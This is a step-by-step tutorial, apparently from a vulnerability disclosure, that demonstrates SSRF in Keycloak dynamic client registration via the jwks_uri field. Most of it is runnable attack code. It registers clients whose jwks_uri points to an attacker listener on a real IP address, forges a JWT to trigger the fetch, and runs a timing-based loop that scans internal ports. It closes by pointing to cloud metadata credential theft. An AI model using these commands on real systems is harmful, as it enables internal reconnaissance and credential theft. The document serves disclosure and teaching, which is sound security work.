# Tutorial: Finding #6 — SSRF via DCR jwks_uri

**Severity:** MEDIUM (CVSS 6.5)
**Demo time:** ~8 minutes
**Requirements:** 2 Terminals

---

## Attack Scenario

An attacker with the `create-client` role registers an OIDC client via DCR with a `jwks_uri` pointing to an internal address. When JWT authentication is triggered, Keycloak fetches that URL — SSRF!

---

## Step 0: Ensure Keycloak is Running and testuser Has the create-client Role

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

Set up the role if not already done (same as Finding #5):
```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

RM_CLIENT=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients?clientId=realm-management" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

curl -s -o /dev/null -w "Assign role: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

---

## Step 1: (ATTACKER) Login as testuser

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp" \
  -d "grant_type=password" \
  -d "username=testuser" \
  -d "password=Password123" \
  -d "scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Attacker token: ${ATTACKER_TOKEN:0:40}..."
```

---

## Step 2: Set Up HTTP Listener (Terminal 1)

Open a new terminal — this will capture the SSRF request from Keycloak:

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'')
        print(f'=== SSRF via JWKS_URI DETECTED! ===')
        print(f'Method:     {self.command}')
        print(f'Path:       {self.path}')
        print(f'Host:       {self.headers.get(\"Host\")}')
        print(f'User-Agent: {self.headers.get(\"User-Agent\")}')
        print(f'=====================================')
        print(f'')
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(b'{\"keys\":[]}')
    def log_message(self, *a): pass
print('Listener ready on port 49997...')
print('Waiting for Keycloak to fetch jwks_uri...')
HTTPServer(('0.0.0.0', 49997), H).serve_forever()
"
```

---

## Step 3: (ATTACKER) Register DCR Client with Internal jwks_uri (Terminal 2)

```bash
DCR_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "ssrf-probe",
    "redirect_uris": ["https://test.com/cb"],
    "grant_types": ["authorization_code", "client_credentials"],
    "response_types": ["code"],
    "token_endpoint_auth_method": "private_key_jwt",
    "jwks_uri": "http://46.101.162.187:49997/internal-jwks"
  }')

echo "$DCR_RESP" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print('=== DCR CLIENT REGISTERED ===')
print(f'Client ID:  {d.get(\"client_id\")}')
print(f'jwks_uri:   http://46.101.162.187:49997/internal-jwks')
print(f'Auth method: private_key_jwt')
print('============================')
"

CLIENT_ID=$(echo "$DCR_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_id'])")
echo "Client ID: $CLIENT_ID"
```

> **jwks_uri accepted without validation!** Keycloak does not check whether the URL is internal/private.

---

## Step 4: Create JWT Client Assertion

This JWT will force Keycloak to fetch `jwks_uri` to validate the signature:

```bash
JWT_HEADER=$(echo -n '{"alg":"RS256","kid":"test-key"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

JWT_PAYLOAD=$(python3 -c "
import json,base64,time
p = json.dumps({
    'iss': '$CLIENT_ID',
    'sub': '$CLIENT_ID',
    'aud': 'http://46.101.162.187:8080/realms/test',
    'exp': 9999999999,
    'iat': int(time.time()),
    'jti': 'ssrf-demo'
})
print(base64.urlsafe_b64encode(p.encode()).rstrip(b'=').decode())
")

JWT="${JWT_HEADER}.${JWT_PAYLOAD}.ZmFrZXNpZw"
echo "JWT assertion: ${JWT:0:60}..."
```

---

## Step 5: Trigger SSRF!

Send a request to the token endpoint with the JWT assertion — Keycloak will fetch jwks_uri for verification:

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$CLIENT_ID" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$JWT" \
  | python3 -m json.tool
```

**Output:**
```json
{
  "error": "invalid_client",
  "error_description": "Unable to load public key"
}
```

> The error "Unable to load public key" proves that Keycloak **tried to fetch jwks_uri** and received `{"keys":[]}` (no matching key).

---

## Step 6: Check Listener (Terminal 1)

**Output on the listener:**
```
=== SSRF via JWKS_URI DETECTED! ===
Method:     GET
Path:       /internal-jwks
Host:       46.101.162.187:49997
User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.10)
=====================================
```

> **SSRF CONFIRMED!** Keycloak performed a server-side HTTP GET to an address specified by the attacker!

---

## Step 7: Demo Port Scanning via SSRF

The attacker can scan internal ports based on response timing:

```bash
echo "=== Port Scanning via SSRF ==="
echo ""

for TARGET in "127.0.0.1:8080" "127.0.0.1:22" "127.0.0.1:3306" "127.0.0.1:9999"; do
  # Register a client for each target
  SCAN_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
    -H "Authorization: Bearer $ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
      \"client_name\": \"scan-${TARGET//[:.]/-}\",
      \"redirect_uris\": [\"https://test.com/cb\"],
      \"grant_types\": [\"client_credentials\"],
      \"response_types\": [\"code\"],
      \"token_endpoint_auth_method\": \"private_key_jwt\",
      \"jwks_uri\": \"http://${TARGET}/jwks\"
    }")
  SCAN_ID=$(echo "$SCAN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('client_id','ERROR'))" 2>/dev/null)

  if [ "$SCAN_ID" != "ERROR" ]; then
    # Trigger fetch and measure timing
    START=$(date +%s%3N)
    curl -s -o /dev/null -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
      -d "client_id=$SCAN_ID&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJ0ZXN0In0.fake" 2>/dev/null
    END=$(date +%s%3N)
    ELAPSED=$((END - START))
    echo "  $TARGET  →  ${ELAPSED}ms"
  fi
done

echo ""
echo "Open port: fast response"
echo "Closed port: slow response (timeout)"
```

**Example output:**
```
=== Port Scanning via SSRF ===

  127.0.0.1:8080  →  15ms     (Keycloak - OPEN)
  127.0.0.1:22    →  80ms     (SSH - OPEN)
  127.0.0.1:3306  →  5002ms   (MySQL - CLOSED)
  127.0.0.1:9999  →  5001ms   (Random - CLOSED)
```

---

## Step 8: Run Python PoC (Fully Automated)

```bash
python3 pocs/poc_f6_dcr_jwks_ssrf.py --host http://localhost:8080 --listen-port 49997
```

---

## Summary

| Test | Result | Status |
|---|---|---|
| Register DCR client with internal jwks_uri | Accepted without validation | VULNERABLE |
| Trigger JWKS fetch via JWT assertion | Keycloak fetches URL | VULNERABLE |
| Port scanning via timing | Open vs closed ports clearly distinguishable | VULNERABLE |

**Comparison with Finding #4:**
| | Finding #4 (IdP SSRF) | Finding #6 (DCR SSRF) |
|---|---|---|
| Required role | `manage-identity-providers` (admin-level) | `create-client` (lower privilege) |
| HTTP method | GET + POST | GET |
| Trigger | Directly via admin API | DCR + JWT authentication |

**Conclusion:** A user with the `create-client` role can perform SSRF to scan internal networks, including accessing cloud metadata endpoints (`169.254.169.254`) to steal IAM credentials.
